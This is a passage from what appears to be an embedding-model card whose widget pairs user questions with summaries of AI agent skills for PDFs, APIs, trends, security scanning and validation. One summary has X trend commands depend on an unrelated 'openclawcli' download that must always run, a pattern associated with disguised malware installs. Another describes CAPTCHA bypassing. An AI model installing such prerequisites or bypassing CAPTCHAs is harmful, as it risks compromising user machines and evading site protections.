  - dataset_size:60245
  - loss:TripletLoss
  base_model: Qwen/Qwen3-Embedding-0.6B
  widget:
  - source_sentence: How do I extract invoice totals from a PDF invoice layout?
    sentences:
    - "The PDF Extraction Skill is designed for extracting text, tables, and metadata from PDF files via the pdfplumber library,\
      \ which provides granular access to PDF elements, unlike conventional PDF readers. The workflow begins with the user\
      \ supplying a PDF document and indicating the desired type of content to extract, which can include text, tables, images,\
      \ or metadata. The skill will then generate and execute the appropriate pdfplumber code based on user requests. For\
      \ example prompts include tasks like extracting tables from financial reports or specific text from document pages.\n\
      \nThe fundamental structure of a PDF involves metadata (like title and author), pages containing various elements (characters,\
      \ words, lines, shapes, and images), and an outline for navigation. Key functionalities include basic text extraction,\
      \ advanced text extraction options including layout preservation, and character-level access for detailed manipulation\
      \ of characters within the PDF.\n\nTable extraction can be performed with both basic settings and advanced customization\
      \ options to improve accuracy based on the PDF’s layout. Moreover, the skill features visual debugging tools to help\
      \ users understand the structural layout of a PDF by marking element boundaries, enhancing the extraction process. Cropping\
      \ to specific areas, filtering content based on position or font, and accessing document metadata are also supported.\
      \ \n\nBest practices for using the skill include visually debugging with generated images to gain insight into PDF structures,\
      \ fine-tuning table settings based on document specifics, avoiding processing large PDFs all at once, and ensuring the\
      \ presence of text as some PDFs might only contain images. Common examples provided include how to extract tables into\
      \ dataframes using pandas, structured data from invoices, and parsing sections from resumes. \n\nThe skill cannot extract\
      \ from scanned PDFs and requires OCR for such cases, while it also has limitations like handling encrypted PDFs and\
      \ potentially facing challenges with complex layouts or embedded fonts. The installation instructions are straightforward\
      \ using pip to install pdfplumber and Pillow for additional image functionalities."
    - 'The Mistral OCR PDF extraction skill provides a streamlined process for Optical Character Recognition (OCR) of PDF
      documents, allowing users to generate Markdown and JSON outputs for further analysis or processing. The skill operates
      primarily through a provided script, `mistral_ocr_extract.py`, which can handle both local PDF files and PDFs available
      via public URLs. The workflow begins with selecting the input mode based on the document''s accessibility: either uploading
      a local file through a Files API for processing or directly using a public URL.  The default options for output fidelity
      are designed to ensure compatibility with typical applications such as Retrieval-Augmented Generation (RAG), including
      inline table formatting unless specified otherwise. Users can opt to extract images, headers, or footers based on their
      document''s content and the resulting OCR quality needs. Upon execution of the script, it produces a well-organized
      output directory that contains concatenated Markdown files for all pages, individual page Markdown files, a JSON file
      of the full OCR response, and directories for any embedded images and extracted tables that were requested. The script
      can also handle structured data extraction using specified annotation prompts to retrieve fields from the document,
      such as supplier names or invoice totals, which enhances the value of the output data. However, guidelines are provided
      for handling common failure modes, such as ensuring the MISTRAL_API_KEY is set, addressing URL accessibility issues,
      and managing problems with large file uploads. Furthermore, it includes reference materials for API parameters, output
      mapping rules, and example prompts to assist users in optimizing their document processing tasks. There are important
      decision rules and operational caveats highlighted to instruct users on preferred practices for managing local versus
      remote files and to ensure output quality, especially when parsing extracted tables.'
    - "The **Dropbox Business** Skill enables developers to interact with the Dropbox Business API utilizing managed OAuth\
      \ authentication. This skill allows effective management of team administration, which encompasses tasks involving members,\
      \ groups, team folders, devices, linked applications, and audit logs. The API utilizes a unified base URL with specific\
      \ endpoints designated for various functions, encapsulated through methods mainly employing `POST` requests, even for\
      \ read operations, and requiring JSON-formatted bodies where applicable. To begin using the API, developers must obtain\
      \ an API key from Maton, setting it as an environment variable (MATON_API_KEY) for authorization in requests. The skill\
      \ includes comprehensive examples in Python, showcasing how to retrieve team information, manage connections, list and\
      \ manipulate team members, groups, folders, namespaces, devices, applications, and access audit logs, ensuring significant\
      \ coverage of business needs.\n\n### Quick Start\nThe skill outlines a quick start guide with bash command scripts that\
      \ demonstrate how to get team information by making `POST` requests to specific endpoints with proper authorization\
      \ headers. For instance, to get team info, a simple script is provided that imports necessary libraries, builds a request\
      \ with the appropriate headers, and prints the JSON response neatly formatted.\n\n### Authentication and API Key Management\n\
      All API requests require OAuth authentication, leveraging the provided API key concatenated into the Authorization header.\
      \ Developers must ensure that the environment variable is appropriately set before making any requests.\n\n### Connection\
      \ Management\nDevelopers can manage their connections through a designated endpoint, allowing listing, creating, and\
      \ deleting connections to the Dropbox Business API. Each operation returns specific data, such as connection IDs and\
      \ URLs for completion of OAuth authorization.\n\n### API Reference\nThe documentation comprehensively details various\
      \ API endpoints such as:\n- **Team Information** (e.g., get_team_info, get_team_features)\n- **Team Members** (e.g.,\
      \ list_membes, add_member, remove_member)\n- **Groups and Team Folders** (e.g., manage groups, create, rename folders)\n\
      - **Devices** (manage member devices and their sessions)\n- **Linked Apps** (list and revoke applications)\n- **Audit\
      \ Logs** (retrieve historical event data for team account activity)\nEach API method is displayed with its specific\
      \ request format, sample JSON requests for input, and expected JSON responses detailing success or failure indications.\n\
      \n### Pagination and Error Handling\nThe documentation incorporates guidance on handling pagination with cursor values\
      \ provided in responses for list-type methods. The skill also outlines structured error handling, providing a table\
      \ that explains different HTTP status codes and proper responses for common errors encountered during API interactions,\
      \ along with a standardized error response format. \n\n### Operational Caveats and Limitations\nDevelopers should take\
      \ heed of certain caveats such as mandatory `POST` operations on almost all endpoints, the requirement of sending `null`\
      \ in cases of no parameters, specificity in using `.tag` to identify members, and recognizing that some groups are system-managed\
      \ and cannot be modified. The guide also emphasizes using 'V2' versions of endpoints for enriched data responses.  To\
      \ support optimal usage, an associated resource list is provided, linking to external documentation and community support\
      \ for further assistance."
  - source_sentence: What commands do I use to check URLs for malware or phishing threats?
    sentences:
    - 'The mind-security skill is an AI security toolkit designed to enhance the detection of security threats related to
      AI-generated content, particularly focusing on deepfakes, prompt injection vulnerabilities, malware and phishing links,
      and AI text distinction. The toolkit comprises four main modules, each responsible for a different aspect of security
      scanning.


      ### Purpose and Scope

      The mind-security skill''s primary purpose is to provide tools for security analysis that harness AI technologies to
      identify and mitigate security risks associated with increasingly sophisticated AI applications. It includes functionality
      for scanning images, videos, URLs, and texts, providing a comprehensive suite for users concerned about the security
      implications of AI.


      ### Workflow Steps and Control Flow

      Each of the skill''s modules can be accessed via specified command line scripts that execute Python scripts. The command
      syntax ensures users can easily interact with each module by entering specific commands with necessary parameters:

      1. **Deepfake detection** is triggered using the command `python3 scripts/check_deepfake.py <path_or_url>`, where users
      can input either a path to a local file or an online URL to detect potential deepfakes.

      2. **Prompt injection scan** is performed by executing `python3 scripts/check_prompt_injection.py "<text>"`. This scan
      assesses the provided text for vulnerabilities related to prompt injection.

      3. **Malware/phishing scan** is conducted through the command `python3 scripts/check_malware.py "https://..."`, checking
      the URL against known evaluations for malicious behaviors.

      4. **AI text detection** utilizes the command `python3 scripts/check_ai_text.py "<text>"`, which scans the text to determine
      if it was generated by AI models.


      Each command results in JSON output to standard output (stdout) while sending any errors to standard error (stderr).


      ### Required Tools and Dependencies

      The core of the mind-security operates on Python''s standard library, ensuring zero external dependencies for basic
      functionality. However, for enhanced prompt injection detection, installation of the optional ML model `llm-guard` is
      necessary via `pip install llm-guard`. Users must set up API keys for certain functionalities like deepfake detection
      and AI text detection (required) or for optional malware scanning integrations from VirusTotal, URLScan.io, and Google
      Safe Browsing.


      ### Command-Line Usage

      The usage of each script is straightforward; users must invoke Python3 and provide the necessary script name and arguments.
      Each script accepts different parameters (like a file path or URL) and returns results in a structured JSON format.
      If the execution is successful, it exits with a code `0`, and an error leads to an exit code of `1`.


      ### Security & Privacy Considerations

      The skill does not store or log any of the data that is sent to third-party services for analysis; it strictly handles
      data transmission without retaining any user information. Various APIs are called upon based on the module in use, and
      all API interactions include explicit timeouts to avoid prolonged waiting periods.


      ### Limitations and Caveats

      Mind-security relies on third-party APIs for comprehensive checks, which may lead to results influenced by their respective
      algorithms and databases. Moreover, as the documentation does not specify certain error handling mechanisms or limitations
      on the frequency of API calls, users may need to investigate issues related to rate limiting or downtime of external
      services. Additionally, the applicability of detection might vary based on the nature of the input data and the ever-evolving
      landscape of AI-generated content.'
    - "The URLCheck skill serves as an intent-aware URL security verifier aimed at enhancing user safety while browsing. It\
      \ systematically checks target web resources for potential security threats and assesses their alignment with user intentions\
      \ before any action—such as navigating, clicking, or opening a link—takes place. The skill operates under the premise\
      \ that both security and user intent are crucial for safe web interactions.\n\n### Purpose and Scope\nThe main purpose\
      \ of the URLCheck skill is to provide a dual-layered assessment of URLs that users may interact with. It not only aims\
      \ to detect security threats like phishing, malware, and suspicious patterns but also evaluates how well the target\
      \ resource corresponds to the user's intended action, thereby ensuring a safe browsing experience.\n\n### Workflow Steps\
      \ and Control Flow\nThe operational flow consists of the following steps:\n1. **Installation**: Users must install the\
      \ plugin and restart the gateway before they can utilize the skill. This is done through the command line.\n2. **Verification**:\
      \ Users can then check whether the skill and plugin are properly initialized with specific commands.\n3. **Use Cases**:\
      \ Subsequent URL verifications are performed based on various user actions: before opening links, navigating to pages,\
      \ following redirects, downloading files, submitting credentials, or any critical actions dependent on the destination.\n\
      \n### Required Tools and Dependencies\nThe skill utilizes several command-line tools:\n- **`url_scanner_scan`**: For\
      \ threat-focused verification without intent considerations.\n- **`url_scanner_scan_with_intent`**: For intent-aligned\
      \ checking when the user specifies their goal.\n\nThere are also asynchronous alternatives available: **`url_scanner_scan_async`**\
      \ and **`url_scanner_scan_with_intent_async`**, which facilitate non-blocking scans and task management. Users must\
      \ have internet access and the capability to install the necessary plugin for functionality.\n\n### Command-Line Usage\
      \ and Argument Behavior\nInstallation and checks are executed via the command line:\n- To install the plugin: `openclaw\
      \ plugins install @cybrlab/urlcheck-openclaw`\n- To restart the gateway: `openclaw gateway restart`\n- To verify plugin\
      \ status: `openclaw plugins list | grep -i urlcheck`\n- To verify skill status: `openclaw skills list | grep -i urlcheck`\n\
      - URL scanning commands require specific parameters including `url` and an optional `intent` parameter for alignment\
      \ checks. Results include an `agent_access_directive` indicating whether action should be taken.\n\n### Debugging Guidance\
      \ and Troubleshooting Instructions\nIf URLCheck tools are unavailable, users should be instructed to ensure plugin installation\
      \ and gateway status. For unsuccessful verifications, when the result indicates temporary issues, a retry may be warranted.\
      \ The verification process is time-sensitive; users are advised against abandoning scans prematurely as completion can\
      \ take 30 to 90 seconds. Users should employ cautiously optimistic messaging based on the confidence level of results\
      \ received.\n\n### Input/Output Contracts and File Paths\nInput will include a URL and potentially an intent. The output\
      \ consists of an agent access directive and several fields detailing the risk score, confidence level, and intent alignment.\
      \ All outputs should be formatted cleanly to facilitate user understanding.\n\n### Operational Caveats and Limitations\n\
      - Limitations include a non-use capability for internal references and certain restrictions on the number of scans in\
      \ trial mode.\n- Users must be mindful of using async methods for long tasks versus synchronous direct tools for standard\
      \ checks. \n- Avoid making absolute safety guarantees in user-facing messaging and emphasize probabilities instead."
    - 'The VPick Video Creator is an all-in-one AI video production studio designed to streamline the entire video creation
      process, from generating images and videos to voiceovers and music, culminating in the final export of the project.
      This skill primarily interacts with the VPick platform through a designated MCP (Master Control Protocol) link, which
      contains embedded authentication tokens, thus eliminating the need for separate API keys. All data flows through VPick’s
      server on Google Cloud, routing requests to several AI model providers for image and video processing, while ensuring
      that user-uploaded media is handled securely and stored in Google Cloud Storage under the user’s account. To get started,
      users must first sign up on the VPick website, obtain their MCP link, and integrate it into the Claude settings. The
      skill supports diverse video generation models that differ in duration, sound capabilities, cost, and suitability for
      various production needs. Furthermore, there are various image and audio models available for reference imagery, voice
      generation, music composition, and audio manipulation.


      The video production pipeline comprises several steps:


      1. **Pre-production**: Generating character designs and storyboards.

      2. **Video generation**: This can be done in either Single Shot or MultiShot mode, the latter allowing multiple scenes
      to be generated with character consistency.

      3. **Audio production**: Involves generating voiceovers, music, and adding additional audio features like lip-syncing
      and vocal separation.

      4. **Post-production**: Combining generated clips, mixing audio tracks, and exporting the final video.


      The core workflow starts with setting up the canvas to manage projects and assets, followed by preparing inputs for
      video generation. This involves creating textual prompts and allowing the generation of required images if not already
      available. Then, the actual video generation occurs, either for single scenes or so-called MultiShot scenarios. The
      audio components can be integrated using various tools for voices, music, and sound mixing. Finally, videos can be combined,
      audio tracks merged, and the final product organized in a clean slate for easy management.


      Operational caveats include ensuring the correct matching of element names for MultiShot videos, confirming project
      credit balances, and adhering to file format requirements. Debugging guidance is provided through error handling mechanisms
      for common issues, including generation timeouts and mismatches in element naming. The skill can accommodate automated
      workflows, allowing users to set up and run pipelines for repeatable tasks. This is great for both novice and skilled
      video producers looking to harness the power of AI in video creation processes while maintaining efficiency and professionalism.


      Overall, VPick Video Creator stands out as a comprehensive solution for automated video production, encapsulating the
      entire workflow within its ecosystem though reliant on online services and models for functionality.'
  - source_sentence: What command should I use to fetch real-time trending topics from the last four hours?
    sentences:
    - "The AIVideoMaker API Executor skill provides a comprehensive workflow for interfacing with the AIVideoMaker API v1,\
      \ primarily aimed at automating video generation tasks. Its key purposes include creating generation tasks, monitoring\
      \ task statuses, retrieving detailed results of these tasks, and cancelling tasks when necessary. The skill is particularly\
      \ useful for users who require direct API calls, scriptable workflows, and effective handling of retries for rate-limit\
      \ errors (HTTP 429). The environment setup mandates the presence of an API Key (`AIVIDEO_API_KEY`) obtained from the\
      \ AIVideoMaker platform, while optional configurations include `AIVIDEO_TIMEOUT_MS` for request timeout settings and\
      \ `AIVIDEO_MAX_RETRIES` to define the maximum retries during idempotent read requests. \n\nThe skill supports four essential\
      \ actions: `createGeneration`, `getTask`, `getStatus`, and `cancelTask`, and is compatible with a set of predefined\
      \ models (e.g., `t2v`, `i2v`, `lv`, `t2v_v3`, `i2v_v3`). For image inputs, it accommodates both public URLs and base64\
      \ encoded strings, with a recommendation to prefer base64 for reliability. \n\nThe standard operation workflow entails\
      \ validating the model and payload, invoking the `createGeneration` call, and then polling the status using `getStatus`\
      \ until a terminal state is reached (either `COMPLETED` or `FAILED`). In the case of successful completion, the outcome\
      \ is retrieved with `getTask`, while failures provide actionable next steps for resolution. The error handling mechanism\
      \ ensures all API responses are normalized with a consistent structure, covering various potential error scenarios like\
      \ `INVALID_MODEL`, `AUTH_FAILED`, and `RATE_LIMITED`. \n\nCommand-line interactions are facilitated through several\
      \ defined commands enabling full workflow execution, status queries, detail fetching, and task cancellation. Usage guidelines\
      \ stipulate the importance of security practices, emphasizing non-hardcoding of API keys, the significance of passing\
      \ sensitive information through environment variables, and utilizing secure management tools. All requests to the AIVideoMaker\
      \ API are made using HTTPS to safeguard data transmission, with specific precautions outlined regarding the management\
      \ of API keys and image data. The documentation also points to additional resources for a full API reference and example\
      \ usage scenarios, which further aid users in navigating potential failures and operational contexts."
    - 'The X (Twitter) Trends CLI is a command-line interface utility designed for retrieving and analyzing trending topics
      from X (formerly Twitter) using the openclawcli utility. The operation of this skill is contingent upon having openclawcli
      installed and running, which serves as a prerequisite for executing any trend-related commands. The installation process
      for openclawcli differs based on the operating system: users on Windows need to download and extract a ZIP file, while
      macOS users are directed to run a specific command in the Terminal. Directly before using the X Trends CLI, users must
      install the official Twitter command-line tool, twurl, via a Ruby gem command, and authorize it using their Twitter
      API keys. All trend retrieval commands require the openclawcli to be actively running.


      The workflow for accessing trending topics starts with the command to retrieve worldwide trends by making a GET request
      to the trends API endpoint via twurl, followed by piping the results through jq for JSON parsing to filter down to the
      top ten trends. For specific locations, users can specify a WOEID (Where On Earth ID) which identifies various locations
      around the globe such as the USA, Russia, or the UK, and the same jq command can be applied. Users can also fetch a
      list of available trend locations or find the nearest trends based on geographic coordinates. The skill also supports
      searching for recent tweets related to a trending topic, with the ability to apply search filters such as media presence
      and account verification status.


      Output from the trend queries includes details such as the trend name, URL to the search results, tweet volume when
      available, and a flag indicating if the trend is promoted content. It’s essential to note that there are operational
      limits influenced by the Twitter API, including rate limits of 75 requests every 15 minutes for trends, and some trends
      may lack tweet volume data. Users are advised to utilize jq for effective JSON response parsing, as the trends update
      approximately every five minutes.


      In terms of troubleshooting, issues such as failure to fetch trends or API authentication errors may arise, and users
      are provided with specific solutions, such as ensuring that the openclawcli utility is running and checking twurl authorization.
      Additionally, rate limiting is a potential issue, requiring users to wait or change endpoints if exceeded. Overall,
      the functional caveats underline the importance of having openclawcli active at all times, as the command-line skill
      will fail if it is not running. Users should use the provided common WOEIDs table for regional inquiries and be aware
      of the critical dependencies on the openclawcli.'
    - "The Google Trends skill provides a CLI tool for fetching Google Trends data without requiring an API key. The main\
      \ purpose of this skill is to enable users to access various data related to search trends, including daily and real-time\
      \ trends, keyword suggestions, and related topics or queries. The tool operates through a script located in the 'scripts'\
      \ directory (trends.mjs), and users can initiate commands via a terminal using Node.js. \n\nThe workflow involves executing\
      \ the script with a command followed by optional parameters, specified as command-line arguments. The commands available\
      \ are: 1. `daily-trends` - Fetches trending search topics for the current day. 2. `realtime-trends` - Gathers trending\
      \ topics from the last few hours. 3. `autocomplete` - Retrieves suggestions related to a specified keyword. 4. `explore`\
      \ - Analyzes a keyword's trend data over a specified timeframe. 5. `interest-by-region` - Breaks down search interest\
      \ data by geographic region. 6. `related-topics` - Provides topics that are associated with a given keyword. 7. `related-queries`\
      \ - Shows queries that are related to a specified keyword.\n\nEach command can be customized with additional options\
      \ such as geographical focus (using `--geo`), time range (with `--time`), and size of the results (like `--hours` for\
      \ real-time trends). The output format for all commands is JSON, which users should parse to extract the relevant information,\
      \ allowing for flexibility in presentation, such as sorting results into tables or lists based on user preference.\n\
      \nThe script incorporates basic error handling; if requests are rate-limited by Google, it will attempt up to three\
      \ retries with exponential backoff before finally notifying the user to wait and try again. \n\nIn terms of operational\
      \ caveats, the documentation does not specify any environment dependencies beyond having Node.js installed or detail\
      \ specific JSON structure outputs, so users must refer to the provided `reference.md` for comprehensive option details\
      \ per command. Understanding the specific data formats returned in the JSON responses as well as limitations related\
      \ to the frequency of API requests are also crucial for effective usage."
  - source_sentence: How do I validate a Python artifact using the Quorum Validation Skill?
    sentences:
    - "The Quorum Validation Skill, version 0.7.0, is designed for orchestrating a multi-critic validation process specifically\
      \ for software artifacts and configurations. It operates exclusively on an Opus-tier model and not on lower-tier models.\
      \ The workflow consists of several ordered steps: Artifact Classification, Rubric Selection, Pre-Screen Execution, Critic\
      \ Dispatch, Prompt Construction for each Critic, Result Collection, Verdict Assignment, and Report Output. Each step\
      \ has predefined rules and methods that must be strictly followed to ensure accuracy and consistency in validation.\
      \ \n\n1. **Artifact Classification**: The skill determines the artifact's domain based on its file extension and content.\
      \ Specific file types are categorized as **code**, **config**, **research**, or **docs** based on the presence of signal\
      \ words in textual formats. The classification result is stored as `artifact_domain`, crucial for subsequent steps.\
      \ \n\n2. **Rubric Selection**: Based on the `artifact_domain`, the skill maps this to appropriate rubric files located\
      \ in the `rubrics/` directory. The selected rubric is read and parsed for criteria which influences the review by critics.\n\
      \n3. **Pre-Screen Execution**: A deterministic pre-screen process is executed on the target file using a Bash script.\
      \ The script should run within a 30-second timeout and captures various verification results. If it fails, error logging\
      \ occurs, but the pipeline continues to accommodate data from other steps.\n\n4. **Critic Dispatch**: Four critics are\
      \ dispatched in parallel using an Agent tool, each tasked with evaluating different aspects (correctness, completeness,\
      \ security, code hygiene) according to defined prompts. Each critic operates on Sonnet tier and has specific error handling\
      \ procedures in place to ensure continued operation even if some critics fail.\n\n5. **Prompt Construction for Each\
      \ Critic**: For each critic, prompts that include pertinent artifact details, rubric criteria, and pre-screen proof\
      \ are constructed. Special care is taken to mitigate potential adversarial prompt injections by wrapping the artifact’s\
      \ content within `<artifact>` tags and providing explicit instructions on evaluation.\n\n6. **Result Collection**: Responses\
      \ from critics are collected and validated against evidence requirements. Findings lacking required evidence are excluded,\
      \ while successful findings are combined into a merged list.\n\n7. **Verdict Assignment**: A deterministic rule set\
      \ applies to the findings to determine the overall verdict which could be **REJECT**, **REVISE**, **PASS_WITH_NOTES**,\
      \ or **PASS** based solely on the severity levels found in the results.\n\n8. **Report Output**: A final structured\
      \ report summarizes the validation results, including details such as the verdict, findings, and pre-screen results.\
      \ The report is output in markdown format and can optionally be saved to a file.\n\nThe skill requires environments\
      \ with Python installed for scripting and access to specified directories for rubrics and prompts. Input files must\
      \ be appropriately formatted, and outputs are structured JSON results. Operational caveats include restrictions on file\
      \ types (e.g., binary files are unsupported), and the importance of handling errors systematically to ensure the validation\
      \ pipeline is robust against common failures such as missing files or scripts. Ultimately, this skill serves a rigorous\
      \ process aimed at maintaining high standards in software validation, necessitating strict adherence to its outlined\
      \ procedures and safeguards against various forms of failure."
    - "The Skill Sonar — Route StaJ is a comprehensive system designed to manage skill safety checks and executions within\
      \ a controlled environment. The purpose of the skill is to ensure that all tasks involving skills are undertaken with\
      \ appropriate caution, considering both the pre-use assessment (Preflight) and the operational assessment (Runtime).\
      \ Two primary workflows are defined: \n\n1. **Preflight Workflow**: This phase involves the preparation and vetting\
      \ of a skill before it is actively used. It includes the following steps: \n   - Inspecting the skill files, permissions,\
      \ scripts, and overall trustworthiness of the skill. \n   - Analyzing various components to identify potential security\
      \ risks or functionality issues before the skill is engaged. The markdown specifies that references for this phase are\
      \ found in `preflight/preflight-guard.md`. \n\n2. **Runtime Workflow**: This phase occurs once a skill is active and\
      \ involves the evaluation of the tool calls being executed and the resulting outputs. Essential steps include: \n  \
      \ - Monitoring ongoing tasks, noting any output produced and side effects observable during the execution of skill functions.\
      \ \n   - The reference documentation for this phase is found in `runtime/runtime-guard.md`.\n\nA key distinction is\
      \ established between analyzing the skill itself (Preflight) and monitoring active task executions (Runtime). The skill\
      \ identifies that when there is ambiguity—defined as an unknown skill—the flow should default to Preflight assessment.\
      \ In contrast, if a skill is already installed, the process will engage Runtime assessment.\n\nUsers have the option\
      \ to override the default settings, allowing engagement of either Preflight, Runtime, or both functions, with a preference\
      \ for user overrides. The skill also emphasizes ‘full protection’ measures for high-risk profiles, advising that Preflight\
      \ checks should precede Runtime evaluations in a serial sequence to mitigate risks effectively.\n\n## Constraints and\
      \ Operational Guidelines:\n1. All output responses should be delivered in the user's chosen language.\n2. The proposed\
      \ guards are advisory; ultimate decision-making remains with the user.\n3. Files should be loaded only as they are required,\
      \ ensuring efficient use of resources.\n4. Any attempts to bypass the established protocols will trigger a risk signal\
      \ that must be escalated, ensuring there is no de-escalation of security measures under any circumstances."
    - "Quorum is a validation system specifically designed to assess AI agent outputs by utilizing multiple independent critics\
      \ who evaluate artifacts against established rubrics. Its primary purpose is to ensure the quality and reliability of\
      \ AI-generated materials by enforcing a structured analysis process where every criticism is backed by explicit evidence,\
      \ culminating in clear verdicts. The workflow begins with the user cloning the repository, installing dependencies,\
      \ and then running validation checks on specified files or directories using the command line. Users initiate validation\
      \ through the command `python -m quorum.cli run --target <path-to-artifact> --rubric <rubric-name>`, where they can\
      \ specify the artifact location and the desired rubric for evaluation. \n\nQuorum includes built-in rubrics tailored\
      \ for different input types, including `research-synthesis` for research reports, `agent-config` for agent configurations,\
      \ and `python-code` for source files. Users can choose from predefined depth profiles, such as `quick`, `standard`,\
      \ and `thorough`, which dictate the number of critics that will assess the artifact and the overall time the process\
      \ will take, ranging from approximately 5 to 60 minutes based on selected depth. Each profile incorporates a deterministic\
      \ pre-screen that performs essential checks on the artifact before running any LLM critics.\n\nExamples of command-line\
      \ usage demonstrate versatility, allowing for individual file validation or bulk processing of directories. Cross-artifact\
      \ consistency checks can be performed using a relationships manifest when the `--relationships` flag is employed. Quorum\
      \ can also accept custom rubrics provided by the user. \n\nConfiguration of Quorum is user-friendly, with a prompt upon\
      \ first run for preferred models, which can also be set up manually in `quorum-config.yaml`. Users can configure their\
      \ environment by defining API keys necessary for model access. \n\nThe output of a Quorum validation run consists of\
      \ a structured verdict categorized into distinct labels like **PASS**, **PASS_WITH_NOTES**, **REVISE**, and **REJECT**,\
      \ each with corresponding exit codes and severity levels for findings. The results include detailed reports in various\
      \ formats that feature findings, evidence citations, and recommendations for remediation. The system's operational caveats\
      \ include the necessity of running checks with valid API keys and understanding that configurations may require adjustment\
      \ based on the user's specific use case and requirements. \n\nFor further guidance, additional documentation is available\
      \ outlining system specifications, model requirements, configuration options, and helpful resources for beginners, promoting\
      \ ease of onboarding and effective utilization of the Quorum system."
  - source_sentence: What are the steps to connect to the OCR Web Service using Membrane CLI?
    sentences:
    - 'The 2Captcha skill provides developers and businesses with a practical means of bypassing CAPTCHA challenges on various
      web and application platforms using a service that outsources the solving of these CAPTCHAs to human workers. The skill
      operates through Membrane CLI, which facilitates interaction with the 2Captcha service while automating authentication,
      credential refresh, and HTTP header management to simplify integration. The main features include support for different
      types of CAPTCHAs (Image, ReCaptchaV2, ReCaptchaV3, GeeTest, HCaptcha, Turnstile, MtCaptcha, KeyCaptcha, Text), making
      it versatile for varied use cases.


      ### Workflow Steps and Control Flow

      1. **CLI Installation:** Users start by installing the Membrane CLI, which is required to run commands that interact
      with 2Captcha. This is done using `npm install -g @membranehq/cli`.

      2. **Authentication Setup:** First-time users authenticate through a browser using the command `membrane login --tenant`.
      In headless environments, a unique URL is provided for manual completion.

      3. **Creating a 2Captcha Connection:** Users create a connection to the 2Captcha service using a specific connector
      ID, retrieved from a search command. The command `membrane connect --connectorId=CONNECTOR_ID --json` initiates this
      connection process.

      4. **Managing Connections:** To check existing connections, the command `membrane connection list --json` is used which
      lists all established connections. Users can note the `connectionId` for further actions.

      5. **Searching Actions:** To discover available actions based on intent, users can run `membrane action list --intent=QUERY
      --connectionId=CONNECTION_ID --json`, which returns a list of action objects with their IDs and schemas.

      6. **Running Actions:** Actions are executed using the command `membrane action run --connectionId=CONNECTION_ID ACTION_ID
      --json`, during which JSON parameters can be passed for specific configurations.

      7. **Proxy Requests:** When built-in actions do not suffice, developers can directly interact with the 2Captcha API
      using `membrane request CONNECTION_ID /path/to/endpoint`, along with various flags for HTTP methods, headers, and body
      data.


      ### Required Tools and Environment Assumptions

      - Node.js environment (for the installation of Membrane CLI).

      - Access to a web browser for initial authentication, unless operating in a headless environment where manual interaction
      is feasible.


      ### Command-Line Usage and Argument Behavior

      - **CLI Commands:** Predominantly utilize `membrane` commands in the terminal.

      - **Arguments:** Various commands accept flags and JSON input. For example, `--json` denotes that input will be in JSON
      format, while others specify HTTP methods and query parameters.


      ### Input/Output Contracts and Data Formats

      - Input should conform to JSON schemas outlined in action descriptions.

      - Output format for commands generally includes JSON responses detailing the results of operations, such as connection
      ids, action ids, and any errors encountered.


      ### Operational Caveats and Limitations

      - The skill highly recommends the use of Membrane for API interactions to minimize the risk of errors in direct API
      calls.

      - It is advisable to search for pre-built actions before creating custom API calls, as Membrane accounts for pagination
      and possible edge cases in handling API communications.

      - Each action may incur token usage, which could be limited depending on the specifics of the Membrane and 2Captcha
      service agreements.'
    - 'The Server Health Skill is a command-line tool designed for quick server monitoring, providing insights into system
      statistics, processes, OpenClaw gateway information, and running services. It employs a script called `server-health.sh`
      that users can execute in their terminal. The tool offers various usage modes including standard view, verbose output,
      JSON format for automation, and alerts for warnings or errors based on system metrics.


      ### Usage and Workflow

      Users can run the script with different flags:

      - **Standard view**: `./server-health.sh` provides a basic overview of the server''s status.

      - **Verbose mode**: `./server-health.sh --verbose` enriches the output by including additional details like temperature,
      network stats, swap usage, and I/O without requiring user interruptions.

      - **JSON output**: `./server-health.sh --json` sends output in JSON format, catering specifically to automation processes
      that require structured data handling.

      - **Alerts only**: `./server-health.sh --alerts` filters the output to show alerts related to resource usage (for instance,
      CPU, RAM, and disk thresholds).


      ### Output Details

      The outputs are structured into several sections:

      - **Always displayed** information includes system stats like CPU usage, RAM availability, disk usage, and server uptime.
      It lists the top processes by CPU and RAM consumption and shows the status and configuration of the OpenClaw gateway.

      - **Conditionally displayed** alerts trigger if resource usage exceeds predefined thresholds (i.e., disk >90%, RAM >80%,
      CPU >90%) or if swap space is in use.

      - **Verbose mode only** provides further details that can be vital for in-depth diagnostics like temperature readings
      (if sensor data is available), current network traffic, disk I/O rates, and specifics on running services.


      ### Example Output

      An example output provides a clear visual metric of server health, presenting the data in an easy-to-read style, spanning
      from general system health indicators to detailed process utilization and gateway status.


      ### Operational Caveats and Limitations

      This tool assumes a certain environment where the underlying system supports the required metrics (e.g., if temperature
      sensors are absent, temperature readings will not be shown). Additionally, monitoring accuracy depends on the correct
      configuration of the OpenClaw gateway and services like Docker and PostgreSQL that should be running on the system.
      The output formatting, especially in verbose mode, may depend on the terminal''s capability to display special characters
      for better visualization.'
    - "The OCR Web Service is designed to transform images containing text into machine-readable text formats, facilitating\
      \ automation in data entry and document processing for developers and businesses. Utilizing the OCR Web Service enables\
      \ various applications such as extraction of text from scanned documents and images in formats like PDFs. The service\
      \ operates using the Membrane CLI, which abstracts the complexities of authentication and credential management, enabling\
      \ developers to focus on integration rather than authorization setups. \n\n### Installation and Setup\n\nTo start using\
      \ the OCR Web Service, developers must first install the Membrane CLI:\n- **Command:** `npm install -g @membranehq/cli`\
      \  \nThis command installs the CLI globally, allowing the user to invoke it from any terminal session. \n\nAfter installation,\
      \ the first-time setup of the CLI requires the user to log in by executing:\n- **Command:** `membrane login --tenant`\
      \  \nThis command will launch a browser for authentication. In headless environments, the user can copy a printed URL\
      \ to perform the login and complete it with a command including a code provided post-authentication.\n\n### Connecting\
      \ to the OCR Web Service\n\nTo connect to the OCR Web Service, developers can create a new connection by:\n1. Searching\
      \ for the OCR Web Service connector with:\n   - **Command:** `membrane search ocr-web-service --elementType=connector\
      \ --json`  \n   The response will contain details including the connector ID.\n2. Establishing a connection as follows:\n\
      \   - **Command:** `membrane connect --connectorId=CONNECTOR_ID --json`  \n   This command will require the user to\
      \ authenticate via a browser, with the output providing a new connection ID. \n\n### Managing Connections\n\nTo verify\
      \ existing connections:\n- **Command:** `membrane connection list --json`  \nThis will list all active connections and\
      \ help identify if a previous OCR connection is established.\n\n### Searching and Running Actions\n\nFor querying available\
      \ actions, users can execute:\n- **Command:** `membrane action list --intent=QUERY --connectionId=CONNECTION_ID --json`\
      \  \nThis command returns action objects containing IDs and input schemas necessary for executing tasks.\n\nTo run a\
